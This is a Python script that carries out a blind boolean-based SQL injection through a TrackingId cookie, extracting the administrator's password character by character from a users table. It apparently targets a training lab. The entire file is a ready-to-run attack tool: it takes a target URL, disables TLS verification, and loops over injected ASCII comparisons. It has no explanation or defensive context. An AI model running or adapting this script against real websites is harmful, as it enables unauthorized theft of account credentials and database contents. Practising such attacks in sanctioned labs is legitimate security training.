import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted=""
    for i in range (1,21):
        for j in range(32,126): # ASCII number of all the characters
            sqli_payload="' and (select ascii(substring(password,%s,1)) from users where username='administrator') = '%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload) #URL Encode the Paylod
            cookies = {'TrackingId' : 'HU6TAHMzoMHSPTLi' + sqli_payload_encoded, 'session' : 'e4dl6GMF4kUGNPmGD8SBkGFVWL4ckalq'}
            
            r = requests.get(url, cookies=cookies, verify=False)
            
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j)) # this function doesn't appent a newline by default
                sys.stdout.flush() #making sure the output is written immediatly
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv)!= 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example {sys.argv[0]} www.example.com")
        
    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)
    
if __name__ == "__main__":
    main()